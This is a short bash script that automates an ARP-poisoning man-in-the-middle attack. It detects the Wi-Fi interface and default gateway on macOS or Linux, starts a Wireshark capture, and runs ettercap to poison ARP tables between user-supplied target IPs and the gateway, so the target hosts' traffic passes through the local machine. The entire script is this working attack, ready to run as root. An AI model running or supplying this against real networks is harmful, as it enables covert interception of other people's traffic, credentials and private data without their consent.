#!/bin/bash -
#==============================================================================
#
#          FILE: bronn.sh
#
#         USAGE: ./bronn.sh
#
#   DESCRIPTION:
#
#       OPTIONS: ---
#  REQUIREMENTS: ---
#          BUGS: ---
#         NOTES: ---
#        AUTHOR: Aviv Laufer (), aviv@rounds.com
#  ORGANIZATION: Rounds.com
#       CREATED: 11/15/2013 11:40
#      REVISION:  ---
#===============================================================================

set -o nounset                              # Treat unset variables as an error
E_BADARGS=65
EXPECTED_ARGS=1

if [ $# -ne $EXPECTED_ARGS ]; then
    echo "Usage: `basename $0` {IP's to capture}"
    echo "for example 10.0.0.2 or sudo bronn.sh 10.0.0.2,3,12"
    exit $E_BADARGS
 fi
WHOAMI=`whoami`
if [ $WHOAMI != "root" ]; then
    echo You must be root in order to use this script
    exit 1
fi
OS=`uname`
if [ $OS = "Darwin" ];then
    GW=`netstat -nr| grep default| awk '{print $2}'`
    WI=`networksetup -listallhardwareports| grep Wi-Fi -A 1| grep Device |awk '{print $2}'`
elif [ $OS = Linux ]; then 
    WI=`iwconfig 2>/dev/null|awk 'NR==1 {print $1}'`
    GW=`route -n |grep 0.0.0.0|awk 'NR==1 {print $2}'`
else
    echo Poor bastard you probabaly run Windows, may good help you!
fi
echo Starting Wireshark
wireshark -i $WI -k  &>/dev/null &
echo Starting Ettercap, Press q to quit
ettercap -T -i $WI -M arp /$1/ /$GW/ &> /dev/null 

